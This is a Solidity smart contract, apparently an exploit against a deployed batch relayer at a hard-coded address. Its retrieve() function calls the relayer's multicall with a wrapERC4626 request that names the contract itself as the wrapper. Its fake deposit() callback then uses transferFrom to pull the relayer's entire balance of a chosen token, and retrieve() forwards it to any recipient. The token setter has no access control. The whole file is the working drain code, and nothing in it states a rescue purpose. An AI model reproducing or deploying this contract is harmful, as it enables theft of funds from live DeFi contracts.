// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/interfaces/IERC20.sol";

pragma solidity ^0.8.0;

interface IBatchRelayer {
    function multicall(bytes[] calldata data) external payable returns (bytes[] memory results);

    function getVault() external view returns (address);
}

contract TokenRetriever {
    address public batchRelayer = address(0x419F7925b8C9e409B6Ee8792242556fa210A7A09);
    address public retrievalToken;

    constructor(address _retrievalToken) {
        retrievalToken = _retrievalToken;
    }

    function retrieve(address to) external {
        uint256 tokenBalance = IERC20(retrievalToken).balanceOf(batchRelayer);
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSignature(
            "wrapERC4626(address,address,address,uint256,uint256)",
            address(this),
            batchRelayer,
            address(this),
            tokenBalance,
            0
        );
        IBatchRelayer(batchRelayer).multicall(calls);
        IERC20(retrievalToken).transfer(to, tokenBalance);
    }

    function setRetrievalToken(address tokenAddress) external {
        retrievalToken = tokenAddress;
    }

    function asset() external view returns (address) {
        return retrievalToken;
    }

    function deposit(uint256 _amount, address) external returns (uint256) {
        IERC20(retrievalToken).transferFrom(batchRelayer, address(this), _amount);
        return 0;
    }
}
